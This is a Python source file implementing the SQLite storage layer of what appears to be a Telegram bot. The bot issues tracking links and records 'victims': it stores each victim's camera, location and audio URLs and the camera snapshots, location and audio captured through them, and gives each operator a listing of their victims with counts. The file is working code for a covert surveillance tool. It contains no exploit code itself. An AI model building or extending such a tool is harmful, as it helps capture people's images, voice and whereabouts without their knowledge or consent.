import sqlite3, json, os, threading
from datetime import datetime

DB_PATH = '/data/database.sqlite'

class Database:
    _instance = None
    _lock = threading.Lock()
    
    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
                    cls._instance._initialized = False
        return cls._instance
    
    def __init__(self):
        if self._initialized: return
        self._initialized = True
        self._local = threading.local()
        self._setup()
    
    def _get_conn(self):
        if not hasattr(self._local, 'conn') or self._local.conn is None:
            os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
            self._local.conn = sqlite3.connect(DB_PATH, timeout=10)
            self._local.conn.row_factory = sqlite3.Row
            self._local.conn.execute("PRAGMA journal_mode=WAL")
            self._local.conn.execute("PRAGMA busy_timeout=5000")
            self._local.conn.execute("PRAGMA synchronous=NORMAL")
        return self._local.conn
    
    @property
    def conn(self): return self._get_conn()
    @property
    def c(self): return self.conn.cursor()
    
    def _setup(self):
        self.c.execute("""CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            telegram_id INTEGER UNIQUE NOT NULL,
            username TEXT DEFAULT 'Unknown',
            first_name TEXT DEFAULT '',
            join_date TEXT NOT NULL,
            is_banned INTEGER DEFAULT 0
        )""")
        self.c.execute("""CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_code TEXT UNIQUE NOT NULL,
            telegram_id INTEGER NOT NULL,
            created_at TEXT NOT NULL,
            camera_url TEXT, location_url TEXT, audio_url TEXT,
            camera_data TEXT DEFAULT NULL,
            location_data TEXT DEFAULT NULL,
            audio_data TEXT DEFAULT NULL,
            access_count INTEGER DEFAULT 0,
            last_access TEXT DEFAULT NULL
        )""")
        self.conn.commit()
    
    def get_user(self, tid):
        self.c.execute("SELECT * FROM users WHERE telegram_id=?", (tid,))
        row = self.c.fetchone()
        if row: return dict(row)
        return None
    
    def create_user(self, tid, un, fn=""):
        try:
            self.c.execute("INSERT OR IGNORE INTO users (telegram_id,username,first_name,join_date) VALUES (?,?,?,?)",
                          (tid, un, fn, datetime.now().isoformat()))
            self.conn.commit()
            return True
        except: return False
    
    def create_victim(self, tid, code, cu, lu, au):
        try:
            self.c.execute("INSERT INTO victims VALUES (NULL,?,?,?,?,?,?,NULL,NULL,NULL,0,NULL)",
                          (code, tid, datetime.now().isoformat(), cu, lu, au))
            self.conn.commit()
            return True
        except:
            return False
    
    def update_victim_data(self, code, dtype, data):
        col = 'camera_data'
        if dtype in ('location','location_data'): col = 'location_data'
        if dtype in ('audio','audio_data'): col = 'audio_data'
        try:
            j = json.dumps(data) if isinstance(data,(dict,list)) else str(data)
            self.c.execute(f"UPDATE victims SET {col}=?,access_count=access_count+1,last_access=? WHERE victim_code=?", (j, datetime.now().isoformat(), code))
            self.conn.commit()
            return True
        except: return False
    
    def get_victim_owner(self, code):
        self.c.execute("SELECT telegram_id FROM victims WHERE victim_code=?", (code,))
        row = self.c.fetchone()
        return row['telegram_id'] if row else None
    
    def get_victim(self, code):
        self.c.execute("SELECT * FROM victims WHERE victim_code=?", (code,))
        row = self.c.fetchone()
        if row: return dict(row)
        return None
    
    def get_user_victims(self, tid, limit=50, offset=0):
        self.c.execute("SELECT * FROM victims WHERE telegram_id=? ORDER BY created_at DESC LIMIT ? OFFSET ?", (tid, limit, offset))
        rows = self.c.fetchall()
        return [dict(r) for r in rows]
    
    def get_stats(self):
        s = {}
        self.c.execute("SELECT COUNT(*) FROM users"); s['users'] = self.c.fetchone()[0]
        self.c.execute("SELECT COUNT(*) FROM victims"); s['victims'] = self.c.fetchone()[0]
        self.c.execute("SELECT COUNT(*) FROM victims WHERE camera_data IS NOT NULL"); s['camera'] = self.c.fetchone()[0]
        self.c.execute("SELECT COUNT(*) FROM victims WHERE location_data IS NOT NULL"); s['location'] = self.c.fetchone()[0]
        self.c.execute("SELECT COUNT(*) FROM victims WHERE audio_data IS NOT NULL"); s['audio'] = self.c.fetchone()[0]
        return s

db = Database()
